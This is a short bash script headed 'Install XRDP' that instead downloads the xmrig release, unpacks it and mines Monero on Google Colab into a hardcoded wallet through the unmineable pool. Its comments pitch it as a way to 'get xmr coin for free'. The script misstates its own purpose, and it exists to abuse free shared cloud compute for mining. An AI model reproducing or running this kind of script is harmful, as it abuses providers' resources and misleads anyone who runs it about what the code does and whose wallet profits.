#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz
tar zxvf xmrig-6.14.1-linux-x64.tar.gz
cd xmrig-6.14.1
./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:45YzFWkyySfW1cCUSiU45U83qC5u5b5avAe1TwEGNYFuJ3xRCt6ddGCdoL9UNLgETPaVyMg5qtW6yCuGPH1Vej5rEAEwD9b.WORKERNAME -p
